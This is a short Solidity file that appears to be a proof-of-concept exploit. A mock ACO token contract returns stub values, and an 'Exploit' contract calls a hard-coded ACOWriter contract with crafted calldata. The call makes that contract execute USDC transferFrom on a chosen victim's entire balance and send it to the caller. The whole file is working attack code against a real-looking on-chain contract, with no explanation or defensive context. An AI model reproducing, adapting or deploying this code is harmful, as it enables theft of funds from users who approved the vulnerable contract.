//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.4;

import "./IACOWriter.sol";
import "./IERC20.sol";

contract MockACOToken {
    function collateral() public view returns(address) {
        return address(0);
    }

    function mintToPayable(address account) external payable returns(uint256) {
        return 1;
    }

    function balanceOf(address account) public view returns(uint256) {
        return 1;
    }

    function approve(address spender, uint256 amount) public returns(bool) {
        return true;
    }

    function strikeAsset() public view returns(address) {
        return address(this);
    }

    function transfer(address recipient, uint256 amount) public returns(bool) {
        return true;
    }
}

contract Exploit is MockACOToken{
    IACOWriter acowrite = IACOWriter(payable(0xE7597F774fD0a15A617894dc39d45A28B97AFa4f));
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function attack(address _victim) payable public{
        acowrite.write{value: msg.value}(address(this),1,address(usdc),abi.encodeWithSelector(bytes4(keccak256(bytes("transferFrom(address,address,uint256)"))), _victim, msg.sender, usdc.balanceOf(_victim)));
    }
}
